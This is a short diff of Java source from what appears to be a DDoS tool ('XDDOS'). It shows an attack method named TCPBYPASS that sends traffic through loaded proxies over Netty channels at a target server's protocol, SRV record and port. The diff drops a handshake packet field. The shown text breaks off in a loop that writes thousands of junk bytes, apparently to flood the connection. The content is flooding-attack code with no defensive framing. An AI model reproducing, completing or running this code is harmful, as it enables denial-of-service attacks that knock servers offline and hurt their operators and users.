@@ -3,7 +3,6 @@ package XD.XDDOS.methods.impl;
 import XD.XDDOS.XDDOS;
 import XD.XDDOS.methods.IMethod;
 import XD.XDDOS.utils.NettyBootstrap;
-import XD.XDDOS.utils.packet.Handshake;
 import XD.XDDOS.utils.packet.PacketUtils;
 import XD.XDDOS.utils.proxy.ProxyLoader;
 import io.netty.buffer.ByteBuf;
@@ -16,16 +15,11 @@ import java.io.IOException;
 import java.util.zip.Deflater;
 
 public class TCPBYPASS implements IMethod {
-  private Handshake handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
-
-  private byte[] bytes = this.handshake.getWrappedPacket();
-
   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
     ByteBuf b = Unpooled.buffer();
     ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
     try {
       for (int i = 0; i < 20; i++) {
-        boolean i2 = false;
         while (i < 2300) {
           bbbb.write(0);
           bbbb.write(-1);
